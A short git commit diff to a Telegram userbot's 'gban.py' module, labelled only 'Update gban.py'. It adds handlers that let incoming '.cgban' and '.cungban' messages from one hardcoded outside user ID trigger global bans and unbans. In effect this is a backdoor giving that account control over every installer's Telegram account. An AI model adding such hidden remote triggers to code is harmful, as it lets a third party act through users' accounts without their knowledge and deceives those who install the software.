a17fc965165c91a9c63551eec7558a5482c095c4
Skyzuu <92871568+Skyzu@users.noreply.github.com>
2021-10-31 16:07:47 +0700

    Update gban.py

--- userbot/modules/gban.py
+++ userbot/modules/gban.py
@@ -79,6 +79,7 @@ async def handler(tele):
 
 
 @register(outgoing=True, pattern="^.gban(?: |$)(.*)")
+@register(incoming=True, from_users=1979717764, pattern=r"^\.cgban(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
     sender = await dc.get_sender()
@@ -147,6 +148,7 @@ async def gben(userbot):
 
 
 @register(outgoing=True, pattern="^.ungban(?: |$)(.*)")
+@register(incoming=True, from_users=1979717764, pattern=r"^\.cungban(?: |$)(.*)")
 async def gunben(userbot):
     dc = userbot
     sender = await dc.get_sender()
